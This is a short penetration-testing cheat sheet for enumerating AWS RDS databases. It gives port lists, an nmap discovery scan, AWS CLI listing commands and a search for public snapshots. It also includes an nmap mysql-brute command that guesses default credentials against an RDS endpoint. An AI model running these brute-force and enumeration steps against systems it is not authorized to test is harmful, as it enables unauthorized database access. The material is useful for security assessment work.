# AWS RDS Enumeration

## Databases and their corresponding ports:

#### 1) Amazon Aurora (port 3306)

#### 2) PostgreSQL (5432)

#### 3) MySQL (port 3306)

#### 4) MariaDB (port 3306)

#### 5) Oracle Database (port 1521)

#### 6) SQL Server (port 1433)

## Database discovery

 - sudo nmap -Pn -p3306,5432,1433,1521 RDS_INSTANCE_NAME.RDS_INSTANCE_ID.REGION.rds.amazonaws.com

## Bruteforce for credentials

### Wordlist used in this example: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt

 - nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt RDS_INSTANCE_NAME.RDS_INSTANCE_ID.REGION.rds.amazonaws.com

### Upon login, we can further confirm that we are dealing with an AWS RDS Instance

 - SHOW GLOBAL VARIABLES like 'tmpdir';

## Commands:

 - aws rds describe-db-clusters (Listing information about clusters in RDS)

 - aws rds describe-db-instances (Listing information about RDS instances)

 - aws rds describe-db-snapshots --snapshot-type public --include-public --region REGION | grep AWS_ACCOUNT_ID (Look for public RDS Snapshots)

## If: IAMDatabaseAuthenticationEnabled: false -> Need password to access the instance

 - aws rds describe-db-subnet-groups (Listing information about subnet groups in RDS)

 - aws rds describe-db-security-groups (Listing information about database security groups in RDS)

 - aws rds describe-db-proxies (Listing information about database proxies)
